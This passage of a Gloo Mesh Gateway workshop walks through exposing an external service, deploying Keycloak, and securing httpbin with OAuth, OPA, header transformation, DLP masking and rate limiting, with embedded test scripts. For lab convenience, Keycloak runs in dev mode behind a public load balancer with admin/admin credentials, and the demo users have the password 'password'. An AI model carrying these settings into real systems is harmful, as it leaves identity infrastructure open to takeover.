  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: not-in-mesh
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Httpbin team has decided to export the following to the `gateway` workspace (using a reference):
- the `not-in-mesh` Kubernetes service
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`




## Lab 10 - Expose an external service <a name="lab-10---expose-an-external-service-"></a>
[<img src="https://img.youtube.com/vi/jEqDoITpRss/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/jEqDoITpRss "Video Link")

In this step, we're going to expose an external service through a Gateway using Gloo Mesh and show how we can then migrate this service to the Mesh.

Let's create an `ExternalService` corresponding to `httpbin.org`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
  - httpbin.org
  ports:
  - name: http
    number: 80
    protocol: HTTP
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin
            namespace: httpbin
EOF
```

You should now be able to access `httpbin.org` external service through the gateway.

Make sure the domain is in our `/etc/hosts` file:

```bash
./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
```

You can access the `httpbin` service from the second cluster using this URL: [https://cluster1-httpbin.example.com/get](https://cluster1-httpbin.example.com/get).
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the external service", () => {
  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin
            namespace: httpbin
          weight: 50
        - ref:
            name: not-in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
          weight: 50
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the local service", () => {
  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the external service", () => {
  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh your browser, you should see that you get a response either from the local service or from the external service.

When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.

And when the response comes from the local service, there's a `X-B3-Parentspanid` header.

Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - ref:
            name: not-in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the local service", () => {
  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh your browser, you should see that you get responses only from the local service.

This diagram shows the flow of the requests :

![Gloo Mesh Gateway EXternal Service](images/steps/gateway-external-service/gloo-mesh-gateway-external-service.svg)

Let's delete the `ExternalService` we've created:

```bash
kubectl --context ${CLUSTER1} -n httpbin delete externalservices.networking.gloo.solo.io httpbin
```



## Lab 11 - Deploy Keycloak <a name="lab-11---deploy-keycloak-"></a>

In many use cases, you need to restrict the access to your applications to authenticated users.

OpenID Connect (OIDC) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.

The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-Based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.

In this lab, we're going to install Keycloak. It will allow us to setup OIDC workflows later.

Let's install it:

```bash
kubectl --context ${MGMT} create namespace keycloak

kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  selector:
    app: keycloak
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  replicas: 1
  selector:
    matchLabels:
      app: keycloak
  template:
    metadata:
      labels:
        app: keycloak
    spec:
      containers:
      - name: keycloak
        image: quay.io/keycloak/keycloak:22.0.5
        args: ["start-dev"]
        env:
        - name: KEYCLOAK_ADMIN
          value: "admin"
        - name: KEYCLOAK_ADMIN_PASSWORD
          value: "admin"
        - name: PROXY_ADDRESS_FORWARDING
          value: "true"
        ports:
        - name: http
          containerPort: 8080
        readinessProbe:
          httpGet:
            path: /realms/master
            port: 8080
EOF

kubectl --context ${MGMT} -n keycloak rollout status deploy/keycloak
```



<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Keycloak", () => {
  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "keycloak", k8sObj: "keycloak" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Retrieve enterprise-networking ip", () => {
  it("A value for load-balancing has been assigned", () => {
    let cli = chaiExec("kubectl --context " + process.env.MGMT + " -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'");
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Then, we will configure it and create two users:

- User1 credentials: `user1/password`
  Email: user1@example.com

- User2 credentials: `user2/password`
  Email: user2@solo.io

<!--bash
until [[ $(kubectl --context ${MGMT} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done
-->

Let's set the environment variables we need:

```bash
export ENDPOINT_KEYCLOAK=$(kubectl --context ${MGMT} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}'):8080
export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK%:*})
export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK##*:})
export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
```

<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/master/protocol/openid-connect/token"
timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/master/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
-->

Now, we need to get a token:

```bash
export KEYCLOAK_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=admin-cli" \
  -d "username=admin" \
  -d "password=admin" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" |
  jq -r .access_token)
```

After that, we configure Keycloak:

```bash
# Create initial token to register the client
read -r client token <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "expiration": 0, "count": 1 }' \
  $KEYCLOAK_URL/admin/realms/master/clients-initial-access |
  jq -r '[.id, .token] | @tsv')
KEYCLOAK_CLIENT=${client}

# Register the client
read -r id secret <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: bearer ${token}" -H "Content-Type: application/json" \
  -d '{ "clientId": "'${KEYCLOAK_CLIENT}'" }' \
  ${KEYCLOAK_URL}/realms/master/clients-registrations/default |
  jq -r '[.id, .secret] | @tsv')
KEYCLOAK_SECRET=${secret}

# Add allowed redirect URIs
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -X PUT -d '{ "serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'https://cluster1-httpbin.example.com'/*","'https://cluster1-portal.example.com'/*","'https://cluster1-backstage.example.com'/*"] }' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}

# Set access token lifetime to 30m (default is 1m)
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -X PUT -d '{ "accessTokenLifespan": 1800 }' \
  ${KEYCLOAK_URL}/admin/realms/master

# Add the group attribute in the JWT token returned by Keycloak
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true" } }' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models

# Add the show_personal_data attribute in the JWT token returned by Keycloak
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "name": "show_personal_data", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "show_personal_data", "jsonType.label": "String", "user.attribute": "show_personal_data", "id.token.claim": "true", "access.token.claim": "true"} } ' \
  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models

# Create first user
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "username": "user1", "email": "user1@example.com", "enabled": true, "attributes": { "group": "users" }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
  ${KEYCLOAK_URL}/admin/realms/master/users

# Create second user
curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
  -d '{ "username": "user2", "email": "user2@solo.io", "enabled": true, "attributes": { "group": "users", "show_personal_data": false }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
  ${KEYCLOAK_URL}/admin/realms/master/users

```

> **Note:** If you get a *Not Authorized* error, please, re-run the following command and continue from the command that started to fail:

```
KEYCLOAK_TOKEN=$(curl -m 2 -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
```




## Lab 12 - Securing the access with OAuth <a name="lab-12---securing-the-access-with-oauth-"></a>
[<img src="https://img.youtube.com/vi/fKZjr0AYxYs/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/fKZjr0AYxYs "Video Link")

In this step, we're going to secure the access to the `httpbin` service using OAuth.

First, we need to create a Kubernetes Secret that contains the OIDC secret:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: httpbin
type: extauth.solo.io/oauth
data:
  client-secret: $(echo -n ${KEYCLOAK_SECRET} | base64)
EOF
```

Then, you need to create an `ExtAuthPolicy`, which is a CRD that contains authentication information: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: "https://cluster1-httpbin.example.com"
            callbackPath: /callback
            clientId: ${KEYCLOAK_CLIENT}
            clientSecretRef:
              name: oauth
              namespace: httpbin
            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
            logoutPath: /logout
            afterLogoutUrl: "https://cluster1-httpbin.example.com/get"
            session:
              failOnFetchFailure: true
              redis:
                cookieName: keycloak-session
                options:
                  host: redis:6379
            scopes:
            - email
            headers:
              idTokenHeader: jwt
            identityToken:
              claimsToHeaders:
                - claim: email
                  header: X-Email
EOF
```

Finally, you need to update the `RouteTable` to use this `ExtAuthPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      labels:
        oauth: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          exact: /logout
      - uri:
          prefix: /callback
      forwardTo:
        destinations:
        - ref:
            name: not-in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```
<!--bash
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://cluster1-httpbin.example.com/get)" != "302" ]]; do sleep 5; done'
export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user1)
export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user2)
until ([ ! -z "$USER1_TOKEN" ] && [[ $USER1_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user1)
done
until ([ ! -z "$USER2_TOKEN" ] && [[ $USER2_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-httpbin.example.com/get" user2)
done
echo "User1 token: $USER1_TOKEN"
echo "User2 token: $USER2_TOKEN"
-->

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {
  const cookieString = process.env.USER1_TOKEN;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authentication.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: '"X-Email": "user2@solo.io"' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/header-added.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh the web browser, you will be redirected to the authentication page.

If you use the username `user1` and the password `password` you should be redirected back to the `httpbin` application.

Notice that we are also extracting information from the `email` claim, and putting it into a new header. This can be used for different things during our authz/authn flow, but most importantly we don't need any jwt-decoding library in the application anymore!

You can also perform authorization using OPA.

First, you need to create a `ConfigMap` with the policy written in rego:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-solo-email-users
  namespace: httpbin
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
```

Then, you need to update the `ExtAuthPolicy` object to add the authorization step:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: "https://cluster1-httpbin.example.com"
            callbackPath: /callback
            clientId: ${KEYCLOAK_CLIENT}
            clientSecretRef:
              name: oauth
              namespace: httpbin
            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
            logoutPath: /logout
            afterLogoutUrl: "https://cluster1-httpbin.example.com/get"
            session:
              failOnFetchFailure: true
              redis:
                cookieName: keycloak-session
                options:
                  host: redis:6379
            scopes:
            - email
            headers:
              idTokenHeader: jwt
            identityToken:
              claimsToHeaders:
                - claim: email
                  header: X-Email
      - opaAuth:
          modules:
          - name: allow-solo-email-users
            namespace: httpbin
          query: "data.test.allow == true"
EOF
```

Refresh the web page. `user1` shouldn't be allowed to access it anymore since the user's email ends with `@example.com`.
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {

  const cookieString_user1 = process.env.USER1_TOKEN;
  const cookieString_user2 = process.env.USER2_TOKEN;

  it("The httpbin page isn't accessible with user1", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user1 }], retCode: "keycloak-session=dummy" == cookieString_user1 ? 302 : 403 }));
  it("The httpbin page is accessible with user2", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user2 }], retCode: 200 }));

});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-extauth-oauth/tests/authorization.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
If you open the browser in incognito and login using the username `user2` and the password `password`, you will now be able to access it since the user's email ends with `@solo.io`.

This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `extauth` Pod to authorize the request):

![Gloo Mesh Gateway Extauth](images/steps/gateway-extauth-oauth/gloo-mesh-gateway-extauth.svg)




## Lab 13 - Use the transformation filter to manipulate headers <a name="lab-13---use-the-transformation-filter-to-manipulate-headers-"></a>


In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:

Let's create a `TransformationPolicy` to extract the claim.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: TransformationPolicy
metadata:
  name: modify-header
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    phase:
      postAuthz:
        priority: 2
    request:
      injaTemplate:
        extractors:
          organization:
            header: 'X-Email'
            regex: '.*@(.*)$'
            subgroup: 1
        headers:
          x-organization:
            text: "{{ organization }}"
EOF
```

You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).

If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Tranformation is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: '"X-Organization": "solo.io"' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-transformation/tests/header-added.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 14 - Use the DLP policy to mask sensitive data <a name="lab-14---use-the-dlp-policy-to-mask-sensitive-data-"></a>
[<img src="https://img.youtube.com/vi/Uark0F4g47s/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/Uark0F4g47s "Video Link")


Now that we learnt how to put user information from the JWT to HTTP headers visible to the applications, those same applications could return sensitive or protected user information in the responses. 

In this step, we're going to use a Data Loss Prevention (DLP) Policy to mask data in response bodies and headers.

Let's create a `DLPPolicy` to mask protected user information.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: DLPPolicy
metadata:
  name: basic-dlp-policy
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    sanitize: ALL # Enable DLP masking for both responses bodies and access logs
    actions:
    - predefinedAction: ALL_CREDIT_CARDS # AMEX, VISA, MASTERCARD, JCB, DISCOVER, ETC.
    - predefinedAction: SSN # Social Security Number
    - customAction:
        regexActions:
        - regex: '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}' # Email
        - regex: 'eyJ[0-9a-zA-Z_-]+?\.[0-9a-zA-Z_-]+?\.[0-9a-zA-Z_-]+?' # JWT token
EOF
```

By default, the DLP policy will mask the email address with the character `X`, leaving 25% of the characters visible. 
Both character and percentage can be easily changed in the policy.

If you refresh the web page, you should see `X-Email` header masked as `XXXXXXXXXX.io`

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("DLP Policy", function () {
  const cookieString = process.env.USER2_TOKEN;

  it('Email is masked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'XXXXXXXXXX.io' }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-dlp/tests/email-masked.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 15 - Apply rate limiting to the Gateway <a name="lab-15---apply-rate-limiting-to-the-gateway-"></a>


In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.

First, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors we will use later:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerConfig
metadata:
  name: httpbin
  namespace: httpbin
spec:
  destinationServers:
  - ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: organization
            value: solo.io
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
EOF
```

After that, we need to create a `RateLimitPolicy` object to define the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    serverSettings:
      name: rate-limit-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    raw:
      rateLimits:
      - setActions:
        - requestHeaders:
            descriptorKey: organization
            headerName: X-Organization
    ratelimitServerConfig:
      name: httpbin
      namespace: httpbin
      cluster: cluster1
    phase:
      postAuthz:
        priority: 3

EOF
```

Finally, you need to update the `RouteTable` to use this `RateLimitPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      labels:
        oauth: "true"
        ratelimited: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          exact: /logout
      - uri:
          prefix: /callback
      forwardTo:
        destinations:
        - ref:
            name: not-in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Refresh the web page multiple times.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Rate limiting is working properly", function() {
  const cookieString = process.env.USER2_TOKEN;
  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 }));
});

EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/gateway-ratelimiting/tests/rate-limited.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should get a `200` response code the first 3 time and a `429` response code after.

